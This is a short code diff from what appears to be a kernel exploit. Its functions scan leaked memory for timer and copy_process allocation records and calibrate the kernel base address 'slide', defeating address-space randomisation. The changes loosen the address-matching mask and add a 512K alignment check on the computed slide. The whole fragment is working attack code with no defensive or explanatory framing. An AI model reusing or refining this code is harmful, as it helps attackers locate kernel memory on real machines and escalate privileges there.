@@ -497,7 +497,7 @@ static int scan_timer_allocs(const unsigned char *b, size_t n, int pid,
         if (u32(b, i - 4) != (unsigned)pid)
             continue;
         site = u64(b, i);
-        if ((site & 0x1fffffULL) != TIMER_SITE_LOW21)
+        if ((site & 0x7ffffULL) != (TIMER_SITE_LOW21 & 0x7ffffULL))
             continue;
         ptr = u64(b, i + 8);
         if (u64(b, i + 16) != TIMER_ALLOC ||
@@ -552,7 +552,7 @@ static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
         if (u32(b, i - 4) != (unsigned)pid)
             continue;
         site = u64(b, i);
-        if ((site & 0x1fffffULL) != COPY_PROCESS_LOW21)
+        if ((site & 0x7ffffULL) != (COPY_PROCESS_LOW21 & 0x7ffffULL))
             continue;
         ptr = u64(b, i + 8);
         req = u64(b, i + 16);
@@ -869,6 +869,12 @@ static unsigned long long calibrate_base(unsigned char *raw)
                 bestc = hcnt[k];
                 best = hist[k];
             }
+        if (site0 && ((site0 - STATIC_TIMER_SITE) & 0x7ffffULL))
+        {
+            logf("[-] slide %#llx not 512K aligned\n",
+                 site0 - STATIC_TIMER_SITE);
+            return 0;
+        }
         logf("[base] made=%d site=%#llx slide=%#llx best=%#llx count=%llu\n",
              made, site0, site0 ? site0 - STATIC_TIMER_SITE : 0, best, bestc);
         return bestc >= 4 ? best : 0;
